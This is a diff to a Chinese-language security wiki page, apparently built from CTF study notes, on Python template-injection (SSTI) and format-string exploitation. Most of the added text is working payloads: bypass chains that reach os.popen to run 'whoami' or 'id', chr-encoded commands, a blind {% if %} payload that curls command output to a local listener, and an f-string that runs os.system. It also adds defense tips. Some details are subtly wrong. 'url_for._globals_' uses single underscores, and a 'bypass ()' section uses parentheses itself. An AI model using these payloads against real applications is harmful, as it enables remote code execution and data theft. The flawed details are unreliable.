@@ -2,7 +2,8 @@
 title: Python SSTI 多引擎利用与黑名单绕过技巧
 description: 系统梳理 Jinja2、Tornado、Flask 三大 Python 模板引擎的 SSTI 利用与黑名单绕过技巧，覆盖 {{handler.settings}}
   泄露 cookie_secret、url_for/get_flashed_messages 绕过 config/self 黑名单、__class__.__mro__.__subclasses__()
-  通用调用链等实战 Payload
+  通用调用链、利用 __getitem__/pop 绕过括号中括号逗号过滤、chr 编码绕过引号、{% if %} 盲注绕过双大括号、url_for._globals_
+  信息泄露等实战 Payload
 category: program-analysis
 tags:
 - Python
@@ -184,6 +185,108 @@ def safe_jinja(s):
 {{ request.args.a|attr(request.args.b) }}  # ?a=[]&b=__class__.__base__.__subclasses__
 ```
 
+### 补充绕过技巧（XD安全 Day83-85 笔记）
+
+#### 利用 `url_for._globals_` 信息泄露
+
+直接访问 `url_for._globals_` 可泄露全局命名空间，包含 `current_app` 等敏感对象：
+
+```jinja2
+{{ url_for._globals_ }}
+{{ url_for._globals_['current_app'].config }}
+```
+
+#### 绕过括号 `()` 过滤：`__getitem__` 与 `pop`
+
+利用 `__getitem__` 替代 `[]` 下标访问，利用 `pop` 替代索引获取并移除元素：
+
+```jinja2
+# 绕过 __bases__[0] -> __bases__.__getitem__(0)
+# 绕过 __subclasses__()[128] -> __subclasses__().__getitem__(128) 或 __subclasses__().pop(128)
+
+"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen('whoami').read()
+```
+
+#### 绕过引号过滤：`chr` 编码拼接
+
+利用 `__builtins__.chr` 将字符串转为 ASCII 码拼接，避免直接出现引号：
+
+```jinja2
+{% set chr= ().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(250).__init__.__globals__.__builtins__.chr %}
+{{ ().__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.os.popen(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)).read() }}
+```
+
+#### 绕过双大括号 `{{ }}`：`{% if %}` 盲注
+
+利用模板控制结构 `{% if %}` 进行布尔盲注，逐字符提取命令执行结果：
+
+```jinja2
+{% if ''.__class__.__bases__.__getitem__(0).__subclasses__().pop(250).__init__.__globals__.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
+```
+
+> **原理**：通过外带 DNS/HTTP 请求将命令执行结果逐字符判断，配合 `{% if %}` 条件输出 `1` 确认字符匹配。
+
+#### 绕过中括号 `[]` 与逗号 `,` 组合过滤
+
+结合 `__getitem__` 与 `pop` 链式调用，完全避开 `[]` 和 `,`：
+
+```jinja2
+"".__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(128).__init__.__globals__.__builtins__.__import__('os').popen('id').read()
+```
+
+---
+
+## Python 格式化字符串漏洞（Format String Vulnerability）
+
+> **来源**：XD安全 Day83-85 学习笔记
+
+Python 多种字符串格式化方式若用户可控格式化字符串，均可能导致敏感信息泄露或代码执行。
+
+### `%` 操作符（经典格式化）
+
+```python
+>>> name = 'Bob'
+>>> 'Hello, %s' % name
+"Hello, Bob"
+```
+
+### `string.Template`（标准库模板）
+
+```python
+>>> from string import Template
+>>> t = Template('Hey, $name!')
+>>> t.substitute(name='Bob')
+'Hey, Bob!'
+```
+
+### `str.format()` 方法（Python 3+，高风险）
+
+**危害**：可访问对象属性、调用方法、遍历 `__globals__` 实现 RCE。
+
+```python
+# 示例：格式化字符串可控导致敏感数据泄露
+>>> class Config:
+...     SECRET = 'flag{xxx}'
+... 
+>>> config = Config()
+>>> '{}'.format(config.__class__.__mro__[1].__subclasses__())
+# 可进一步构造 RCE 链
+```
+
+### f-Strings（Python 3.6+，最高风险）
+
+**危害**：表达式直接在 `{}` 中求值，可执行任意代码。
+
+```python
+>>> f'{__import__("os").system("id")}'
+uid=0(root) gid=0(root) groups=0(root)
+'0'
+```
+
+> **防御**：严禁将用户输入直接作为格式化字符串模板；使用 `string.Template` 或仅允许数据插值而非表达式求值的安全模板引擎。
+
+---
+
 ## 三大引擎对比速查表
 
 | 特性 | Jinja2 (Flask 默认) | Tornado | Mako |
@@ -192,7 +295,9 @@ def safe_jinja(s):
 | 控制结构 | `{% if %}` | `{% if %}` | `% if` |
 | 访问配置 | `config` / `request.config` | `handler.settings` | `context.get('config')` |
 | 通用调用链 | `__class__.__mro__.__subclasses__()` | `handler.settings` 信息泄露 | `<% import os; os.system('id') %>` |
-| 典型绕过 | `|attr`、`request.args`、内置函数 `__globals__` | `datetime` 模块测试参数 | `%` 指令注入 |
+| 典型绕过 | `|attr`、`request.args`、内置函数 `__globals__`、`__getitem__`/`pop`、`chr` 编码、`{% if %}` 盲注 | `datetime` 模块测试参数 | `%` 指令注入 |
+
+---
 
 ## 实战检测与利用清单
 
@@ -225,19 +330,27 @@ def safe_jinja(s):
 - **SSTImap**：支持多引擎检测
 - **Burp Suite 插件**：SSTI Scanner
 
+---
+
 ## 防御建议
 
 1. **沙箱化模板环境**：Jinja2 启用 `SandboxedEnvironment`
-2. **禁用危险方法**：移除 `__class__`、`__mro__`、`__subclasses__`、`__globals__` 等属性访问
+2. **禁用危险方法**：移除 `__class__`、`__mro__`、`__subclasses__`、`__globals__`、`__getitem__`、`pop` 等属性访问
 3. **输入验证与输出编码**：严格校验用户输入，避免直接拼接进模板
 4. **最小权限原则**：模板渲染进程降权，禁用 `os`、`subprocess` 等模块
 5. **日志审计**：记录模板渲染异常与敏感属性访问
+6. **格式化字符串安全**：禁止用户控制格式化模板字符串；优先使用 `string.Template` 或显式参数绑定
+
+---
 
 ## 相关页面
 
 - [[attack-defense-world-master-advanced-writeup]] — 攻防世界高手进阶区完整 Writeup，含本页面引用的三道 SSTI 题目原始复现过程
 - [[php伪协议与反序列化利用]] — PHP 伪协议与反序列化利用技巧，对比不同语言模板/反序列化攻击面
 - [[ctf-show-php-command-execution-bypass-techniques]] — PHP 命令执行绕过技术，对比 SSTI 与传统 RCE 的利用差异
+- [[xd-security-ctf-flag-notes-day83-85]] — XD安全 Day83-85 学习笔记原文，含序列化、SSTI、Python 格式化字符串、PHP 弱类型/preg_match 绕过、RCE、反序列化、Java WEB-INF/XXE/反编译等内容
+
+---
 
 ## 参考资源
 
@@ -247,6 +360,10 @@ def safe_jinja(s):
 - [Tornado 模板文档](https://www.tornadoweb.org/en/stable/template.html)
 - [Flask 模板上下文](https://flask.palletsprojects.com/en/stable/templating/#standard-context)
 
+---
+
 ## 来源
 
 - [0x00实验室-202108-202304_065](../sources/0x00实验室-202108-202304_065.md)
+- XD安全公众号《XD安全 学习笔记 | CTF夺旗》Day83-85 学习笔记
+- [0x00实验室-202108-202304_097](../sources/0x00实验室-202108-202304_097.md)
